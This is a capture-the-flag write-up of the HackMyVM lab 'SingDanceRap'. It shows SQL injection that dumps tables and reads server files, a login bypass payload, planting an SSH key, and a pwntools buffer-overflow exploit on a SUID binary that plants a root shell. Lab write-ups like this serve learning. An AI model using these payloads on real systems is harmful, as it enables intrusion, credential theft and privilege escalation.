# SingDanceRap

## Recon

::: details nmap_scan.log
```log
Open 10.0.2.59:22
Open 10.0.2.59:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.59

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)
| ssh-hostkey: 
|   2048 5d:41:2a:c1:2d:3b:6c:78:b3:af:ae:9d:42:fe:88:b8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZ6hx/MGKBFi0BVb/ijS9c+HCosUbXdx29X166sIvWds9M57+5aJrSBrBmTSRnUJgtFOglWUnacz2M85JOU6QFD9SQqcl04pELqje+1kMviENow5iRkgIfRGTs1PPs5mPBBE0U7PWnrmf2VJlZH8Vu1+J9ZKGVCOTeD+gk24l9HRHAS/3vrK+11OpzzkjpWXnV5ZITOqlxoX/XCGCVyCHE/TDdDzI1+NorjUPhVa0J+rgOsZJX0wyiWhwFP6NaIHlij6ajYOVYgHrtFon0C8GCnO1lPd+pJkSp0mNyZz0ZUB5fZNVRsmTCFZ5RVFuWgwO4TeubwN08PT4w/vXie1v7
|   256 3c:e9:64:eb:84:fe:5c:83:94:07:27:6c:12:14:c8:4c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLt2cfQKRboXrnZ7oRSTyBMIGcM3o/UNUF+tulhHrT506rtXQ6OkSO78cDZybuYEVZu6oPfFw7dE29kgPQZuhIc=
|   256 09:9b:2b:18:de:6c:6d:f8:8b:15:df:6c:0f:c0:7c:b2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEf2M0an0IG9ZQAiT7MHE6AKovqVw9v65DDda8b+8R6q
80/tcp open  http    syn-ack Apache httpd 2.4.59 ((Debian))
|_http-title: News Website
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.59 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/singdancerap/writeup.png)

### SQLi

First thought was LFI, but nothing was working. Either file appended `.php` or it was not LFI, the files `{TITLE}.php` don't exist.

Then I tried SQLi and it worked.

![writeup-1.png](/assets/pentest/hackmyvm/singdancerap/writeup-1.png)

```bash
└─$ sqlmap -u 'http://singdancerap.hmv/news.php?title=rap' --batch --dbms=MySQL --technique=U --current-db
---
Parameter: title (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: title=rap' UNION ALL SELECT NULL,CONCAT(0x7170707171,0x705574667544766c6a4f574e694341414b6f546d506b5a444e6b755851674f447171594b75527952,0x71717a7171),NULL-- -
---
current database: 'news_db'
```

```bash
└─$ sqlmap -u 'http://singdancerap.hmv/news.php?title=rap' --batch --dbms=MySQL --technique=U -D news_db --tables
Database: news_db
[2 tables]
+-------+
| news  |
| users |
+-------+
```

```bash
└─$ sqlmap -u 'http://singdancerap.hmv/news.php?title=rap' --batch --dbms=MySQL --technique=U -D news_db -T users --dump
Database: news_db
Table: users
[2 entries]
+----+-----------+----------+
| id | password  | username |
+----+-----------+----------+
| 1  | password1 | user1    |
| 2  | password2 | user2    |
+----+-----------+----------+
```

Hmmm... nothing?

### LFI

We have permissions to read files
```bash
└─$ sqlmap -u 'http://singdancerap.hmv/news.php?title=rap' --batch --dbms=MySQL --technique=U --file-read '/etc/passwd'
[*] /home/woyag/.local/share/sqlmap/output/singdancerap.hmv/files/_etc_passwd (same file)
└─$ grep sh$ /home/woyag/.local/share/sqlmap/output/singdancerap.hmv/files/_etc_passwd
root:x:0:0:root:/root:/bin/bash
he110wor1d:x:1001:1001::/home/he110wor1d:/bin/bash
```

```bash
└─$ sqlmap -u 'http://singdancerap.hmv/news.php?title=rap' --batch --dbms=MySQL --technique=U --file-read '/etc/apache2/sites-enabled/000-default.conf'
└─$ grep -vE '^$|#' /home/woyag/.local/share/sqlmap/output/singdancerap.hmv/files/_etc_apache2_sites-enabled_000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```

```bash
└─$ sqlmap -u 'http://singdancerap.hmv/news.php?title=rap' --batch --dbms=MySQL --technique=U --file-read '/etc/apache2/apache2.conf'
└─$ grep -vE '^$|#' /home/woyag/.local/share/sqlmap/output/singdancerap.hmv/files/_etc_apache2_apache2.conf
DefaultRuntimeDir ${APACHE_RUN_DIR}
PidFile ${APACHE_PID_FILE}
Timeout 300
KeepAlive On
MaxKeepAliveRequests 100
KeepAliveTimeout 5
User ${APACHE_RUN_USER}
Group ${APACHE_RUN_GROUP}
HostnameLookups Off
ErrorLog ${APACHE_LOG_DIR}/error.log
LogLevel warn
IncludeOptional mods-enabled/*.load
IncludeOptional mods-enabled/*.conf
Include ports.conf
<Directory />
        Options FollowSymLinks
        AllowOverride None
        Require all denied
</Directory>
<Directory /usr/share>
        AllowOverride None
        Require all granted
</Directory>
<Directory /var/www/he110wor1d/>
        Options -Indexes
        AllowOverride None
        Require all granted
</Directory>
<VirtualHost *:80>
    DocumentRoot /var/www/he110wor1d
    <Directory /var/www/he110wor1d>
        Options -Indexes
        AllowOverride None
        Require all granted
    </Directory>
    <FilesMatch \.php$>
        SetHandler application/x-httpd-php
    </FilesMatch>
   ErrorLog ${APACHE_LOG_DIR}/xxx_error.log
   CustomLog ${APACHE_LOG_DIR}/xxx_access.log combined
</VirtualHost>
AccessFileName .htaccess
<FilesMatch "^\.ht">
        Require all denied
</FilesMatch>
LogFormat "%v:%p %h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" vhost_combined
LogFormat "%h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" combined
LogFormat "%h %l %u %t \"%r\" %>s %O" common
LogFormat "%{Referer}i -> %U" referer
LogFormat "%{User-agent}i" agent
IncludeOptional conf-enabled/*.conf
IncludeOptional sites-enabled/*.conf
```

Automate with script
```python
from requests import Session
from bs4 import BeautifulSoup as BS
import readline

URL = 'http://singdancerap.hmv/news.php'
with Session() as session:
    while True:
        payload = "' UNION SELECT NULL,LOAD_FILE('%s'),NULL -- -" % input('Filename: ')
        resp = session.get(URL, params={'title': payload})
        output = BS(resp.text, 'html.parser').find('div', {'class': 'container'}).find('h2').text
        print(output)
        print()
```

```bash
Filename: /var/www/he110wor1d/news.php
<?php
$servername = "localhost";
$username = "root";
$password = "i_love_sing_dance_rap";
$dbname = "news_db";
```

### Panel

```bash
└─$ feroxbuster -u http://singdancerap.hmv/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt --thorough -D -C 404,400,414,500 --dont-scan css,png,jpeg,jpg,gif -n -x .php -S 281
200      GET       53l      108w     1301c http://singdancerap.hmv/news.php
200      GET       52l      128w     3118c http://singdancerap.hmv/
301      GET        9l       28w      328c http://singdancerap.hmv/littlesecrets => http://singdancerap.hmv/littlesecrets/
```

```
/var/www/he110wor1d/littlesecrets/index.php - Doesn't exist
/var/www/he110wor1d/littlesecrets/login.php - Exists
```

Once we login we are met with `access denied`, only `he110wor1d_admin` can login.
```php
Filename: /var/www/he110wor1d/littlesecrets/manager.php
<?php
session_start();

if (!isset($_SESSION['username'])) { header("Location: login.php"); exit(); }
if ($_SESSION['username'] !== 'he110wor1d_admin') { die("Access Denied. You do not have permission to access this page."); }

$command_output = '';

if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['command'])) {
	$command = $_POST['command'];
	$command_output = shell_exec($command);
}
?>
...
        <h2>Manager Panel</h2>
        <form action="manager.php" method="POST">
            <input type="text" name="command" placeholder="Enter command" required>
            <input type="submit" value="Execute">
        </form>
        <?php if (!empty($command_output)): ?>
            <div class="output">
                <h3>Command Output:</h3>
                <pre><?php echo htmlspecialchars($command_output); ?></pre>
            </div>
        <?php endif; ?>
```

The login page has SQL injection
```php
Filename: /var/www/he110wor1d/littlesecrets/login.php
...
$sql = "SELECT id, username, password FROM users where username='$username'";
...
```

Login with
```
Username: x' UNION SELECT NULL,"he110wor1d_admin","x" -- -
Password: x
```

![writeup-2.png](/assets/pentest/hackmyvm/singdancerap/writeup-2.png)

## SSH

::: tip Creds
`he110wor1d:i_love_sing_dance_rap`
:::

SSH access is denied via password
```bash
└─$ sshpass -p 'i_love_sing_dance_rap' ssh he110wor1d@singdancerap.hmv
he110wor1d@singdancerap.hmv: Permission denied (publickey).

Filename: /etc/ssh/sshd_config
Match User he110wor1d
PasswordAuthentication no
```

```bash
└─$ ssh-keygen -f id_rsa -q -P x && cat id_rsa.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIICSwaCKKUO0/Y/5XlchYVx54iqOz/wns9OKSZlOZraJ woyag@kraken
```

```bash
# Check for .ssh
echo "i_love_sing_dance_rap" | timeout 1 su he110wor1d -c 'ls -alh ~'
# Make .ssh
echo "i_love_sing_dance_rap" | timeout 1 su he110wor1d -c 'mkdir ~/.ssh'
# Add your key
echo "i_love_sing_dance_rap" | timeout 1 su he110wor1d -c 'echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIICSwaCKKUO0/Y/5XlchYVx54iqOz/wns9OKSZlOZraJ woyag@kraken" > ~/.ssh/authorized_keys'
```

And we are in
```bash
└─$ ssh -i id_rsa he110wor1d@singdancerap.hmv
he110wor1d@singdancerap:~$ id
uid=1001(he110wor1d) gid=1001(he110wor1d) groups=1001(he110wor1d)

he110wor1d@singdancerap:~$ find . -type f -ls
      147      4 -rw-r--r--   1 he110wor1d he110wor1d      220 Apr 17  2019 ./.bash_logout
      151      4 -rw-r--r--   1 he110wor1d he110wor1d       94 Sep 28 02:00 ./.ssh/authorized_keys
      265     16 -rwsr-sr-x   1 root       root          15472 Mar  1  2025 ./thekey2root/thekey2root
      152      4 -rw-r--r--   1 he110wor1d he110wor1d     3526 Apr 17  2019 ./.bashrc
      153      4 -rw-r--r--   1 he110wor1d he110wor1d      807 Apr 17  2019 ./.profile
      156      4 -rw-------   1 he110wor1d he110wor1d      109 Feb 28  2025 ./user.txt
```

### User.txt

```bash
he110wor1d@singdancerap:~$ cat user.txt
#SQL injection can not only retrieve data but also forge it.
User flag:107883ee-f5e4-11ef-8542-005056207011
```

## Privilege Escalation

???
```bash
ancerap:~$ file ./thekey2root/thekey2root
./thekey2root/thekey2root: setuid, setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=3902296366fae4694e04363befc5aa43de900fa8, not stripped

he110wor1d@singdancerap:~$ ./thekey2root/thekey2root
input something:
ls
thanks for your input
```

scp is disabled...
```bash
└─$ scp -i id_rsa he110wor1d@singdancerap.hmv:~/thekey2root/thekey2root thekey2root
subsystem request failed on channel 0
scp: Connection closed
```

```bash
└─$ ssh -i id_rsa he110wor1d@singdancerap.hmv 'base64 thekey2root/thekey2root' | base64 -d > thekey2root
└─$ file thekey2root
thekey2root: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=3902296366fae4694e04363befc5aa43de900fa8, not stripped
```

The SUID binary is mostly a placeholder binary, however it's using `system` to print out messages, not `printf`. It's also using relative commands (`echo`) which can be hijacked!

![writeup-3.png](/assets/pentest/hackmyvm/singdancerap/writeup-3.png)

Somehow we need to get inside this function to become root user and then we can execute whatever.
```c
int32_t sing_dance_rap()
{
    setuid(0);
    setgid(0);
    return system("echo 'Hey,bro! What are you looking for?'");
}
```

Test
```bash
he110wor1d@singdancerap:~$ echo $'#!/bin/bash\ninstall -m4777 /bin/bash /tmp/rootbash' | tee /tmp/echo
#!/bin/bash
install -m4777 /bin/bash /tmp/rootbash
he110wor1d@singdancerap:~$ chmod +x /tmp/echo
he110wor1d@singdancerap:~$ export PATH=/tmp:$PATH
he110wor1d@singdancerap:~$ ./thekey2root/thekey2root
input something:
x
thanks for your input
he110wor1d@singdancerap:~$ ls -alh /tmp/rootbash
```

Hmm.. the hijack theory is flawed as it didn't work. File should have been created at least as current user.

### Pwn

All signs point to buffer overflow
```bash
└─$ checksec --file ./thekey2root
[*] '/home/woyag/Desktop/Rooms/HackMyVM/SingDanceRap/thekey2root'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

```bash
└─$ gdb ./thekey2root
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x08049000  _init
0x08049030  setgid@plt
0x08049040  system@plt
0x08049050  __libc_start_main@plt
0x08049060  setuid@plt
0x08049070  __isoc99_scanf@plt
0x08049080  _start
0x080490c0  _dl_relocate_static_pie
0x080490d0  __x86.get_pc_thunk.bx
0x080490e0  deregister_tm_clones
0x08049120  register_tm_clones
0x08049160  __do_global_dtors_aux
0x08049190  frame_dummy
0x08049192  main
0x080491e4  input
0x08049213  sing_dance_rap
0x08049257  __x86.get_pc_thunk.ax
0x08049260  __libc_csu_init
0x080492c0  __libc_csu_fini
0x080492c4  _fini

pwndbg> cyclic 100
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa

pwndbg> run
Starting program: /home/woyag/Desktop/Rooms/HackMyVM/SingDanceRap/thekey2root
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Attaching after Thread 0xf7fc04c0 (LWP 128480) vfork to child process 128483]
[New inferior 2 (process 128483)]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Detaching vfork parent process 128480 after child exec]
[Inferior 1 (process 128480) detached]
process 128483 is executing new program: /usr/bin/dash
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
input something:
[Inferior 2 (process 128483) exited normally]
```

After some research it seems we need to follow parent process because child detaches
```bash
pwndbg> cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
pwndbg> set follow-fork-mode parent
pwndbg> run
Starting program: /home/woyag/Desktop/Rooms/HackMyVM/SingDanceRap/thekey2root
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Detaching after vfork from child process 161079]
input something:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

Program received signal SIGSEGV, Segmentation fault.
0x61616169 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────[ REGISTERS / show-flags off / show-compact-regs off ]────────
*EAX  1
*EBX  0x61616167 ('gaaa')
*ECX  0xf7fc0540 ◂— 0
 EDX  0
*EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0
*ESI  0x8049260 (__libc_csu_init) ◂— push ebp
*EBP  0x61616168 ('haaa')
*ESP  0xffffccc0 ◂— 'jaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
*EIP  0x61616169 ('iaaa')
────────[ DISASM / i386 / set emulate on ]────────
Invalid address 0x61616169
...

└─$ cyclic -l iaaa
32
```

The overflow offset is 32

Now we need argument for `system` call, which ideally should be a string and in C string means array of characters that end with **Null Byte** (`\0`)
```bash
└─$ readelf -p .rodata thekey2root
  [     8]  echo 'input something:'
  [    20]  echo 'thanks for your input'
  [    3d]  %s
  [    40]  echo 'Hey,bro! What are you looking for?'

└─$ readelf -x .rodata thekey2root
  0x0804a000 03000000 01000200 6563686f 2027696e ........echo 'in
  0x0804a010 70757420 736f6d65 7468696e 673a2700 put something:'.
  0x0804a020 6563686f 20277468 616e6b73 20666f72 echo 'thanks for
  0x0804a030 20796f75 7220696e 70757427 00257300  your input'.%s.
  0x0804a040 6563686f 20274865 792c6272 6f212057 echo 'Hey,bro! W
  0x0804a050 68617420 61726520 796f7520 6c6f6f6b hat are you look
  0x0804a060 696e6720 666f723f 2700              ing for?'.
```

The `%s` is the perfect target, because the string ends with Null Byte and it doesn't have any special characters.

Exploit script:
```python
from pwn import ELF, context, flat, process

exe = './thekey2root'
elf = context.binary = ELF(exe)
context.log_level = 'DEBUG' 

offset = 32
sing_dance_rap_address = elf.functions.sing_dance_rap
system_address = 0x08049040
script_address = 0x0804a03e

payload = flat({
    offset: [
        sing_dance_rap_address,
        system_address,
        0x41414141, # Dummy return address for system
        script_address
    ]}
)

with open('payload', 'wb') as f: f.write(payload)

io = process(exe)
io.recvline()
io.sendline(payload)
io.recvallS()
```

POC
```bash
└─$ ls /tmp/pwned
"/tmp/pwned": No such file or directory (os error 2)

└─$ echo 'echo pwned > /tmp/pwned' > s
└─$ chmod +x s
└─$ export PATH=.:$PATH

└─$ py /media/sf_VBoxShare/t.py
[*] '/home/woyag/Desktop/Rooms/HackMyVM/SingDanceRap/thekey2root'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
[+] Starting local process './thekey2root' argv=[b'./thekey2root'] : pid 199872
[DEBUG] Received 0x11 bytes:
    b'input something:\n'
[DEBUG] Sent 0x31 bytes:
    00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│
    00000010  65 61 61 61  66 61 61 61  67 61 61 61  68 61 61 61  │eaaa│faaa│gaaa│haaa│
    00000020  13 92 04 08  40 90 04 08  41 41 41 41  3e a0 04 08  │····│@···│AAAA│>···│
    00000030  0a                                                  │·│
    00000031
[+] Receiving all data: Done (35B)
[DEBUG] Received 0x23 bytes:
    b'Hey,bro! What are you looking for?\n'
[*] Process './thekey2root' stopped with exit code -11 (SIGSEGV) (pid 199872)

└─$ ls /tmp/pwned
/tmp/pwned
```

```bash
he110wor1d@singdancerap:~$ echo 'YWFhYWJhYWFjYWFhZGFhYWVhYWFmYWFhZ2FhYWhhYWETkgQIQJAECEFBQUE+oAQI' | base64 -d > payload
he110wor1d@singdancerap:~$ echo $'#!/bin/bash\ninstall -m4777 /bin/bash /tmp/rootbash' | tee s
#!/bin/bash
install -m4777 /bin/bash /tmp/rootbash
he110wor1d@singdancerap:~$ chmod +x s
he110wor1d@singdancerap:~$ export PATH=.:$PATH

he110wor1d@singdancerap:~$ ./thekey2root/thekey2root < payload
input something:
Hey,bro! What are you looking for?
Segmentation fault

he110wor1d@singdancerap:~$ /tmp/rootbash -p
rootbash-5.0# id
uid=1001(he110wor1d) gid=1001(he110wor1d) euid=0(root) groups=1001(he110wor1d)
```

### Root.txt

```bash
rootbash-5.0# cat root.txt
#During the process of PWN, the execution of the system function does not necessarily have to be bash.

root flag:943ac8c9-f696-11ef-8bd4-005056207011
```